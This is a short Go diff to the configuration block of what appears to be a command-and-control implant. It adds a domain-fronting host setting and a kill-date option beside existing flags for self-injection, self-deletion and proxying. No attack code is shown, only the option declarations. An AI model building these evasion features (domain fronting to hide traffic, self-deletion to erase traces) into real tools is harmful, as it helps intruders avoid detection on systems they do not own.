@@ -33,13 +33,17 @@ var (
 	Counter            = 0
 	ComputerNameLength = 0
 
-	// change remote dll inject to inject self
-	// but execute asm will not get echo
+	/* custom options here  */
+	// change remote dll inject to inject self, but execute asm will not get echo
 	InjectSelf    = true
 	DeleteSelf    = true
 	Support41Plus = false
 	// if debug is false there will be no output
-	Debug = false
+	Debug      = false
+	TimeLayout = "2006-01-02 15:04:05"
+	EndTime    = ""
 	// proxy config
 	ProxyUrl = ""
+	// domain fronting host
+	DomainFrontHost = ""
 )
